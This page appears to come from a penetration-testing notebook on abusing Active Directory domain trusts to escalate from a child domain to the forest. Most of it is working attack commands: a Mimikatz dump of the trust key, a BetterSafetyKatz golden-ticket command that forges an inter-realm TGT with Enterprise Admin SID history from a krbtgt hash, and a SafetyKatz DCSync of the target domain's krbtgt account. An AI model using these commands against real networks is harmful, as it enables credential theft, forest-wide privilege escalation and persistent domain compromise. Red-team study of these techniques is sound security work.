# Trust

### _Using the trust key_&#x20;

First you need the trust key (in)

```mimikatz
lsadump::trust /patch
```

<figure><img src="../../../../.gitbook/assets/Pasted image 20231113153820.png" alt=""><figcaption></figcaption></figure>

Now you can [forge a ticket with SID History of Enterprise Admins](../../../persistence/ticket-forging.md#inter-realm-ticket).&#x20;

Now use rubeus [pass the ticket](../../lateral-movement/pass-the/pass-the-ticket.md) and get access on the other domain's dc

### &#x20;_Using the krbTGT account_&#x20;

With the hash of krbtgt account from dcorp-dc we can create an inter-realm TGT and inject. Using Rubeus

{% code overflow="wrap" %}
```powershell
./BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<CURRENT DOMAIN> /sid:<CURRENT DOMAIN SID> /sids:<SID TO EXTRACT> /krbtgt:<KRBTGT HASH> /ptt" "exit"
```
{% endcode %}

&#x20;

<figure><img src="../../../../.gitbook/assets/Pasted image 20231113161101.png" alt=""><figcaption></figcaption></figure>

Now we can also run a [DC-Sync](dcsync.md)

```cmd
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<TARGET DOMAIN>" "exit"
```
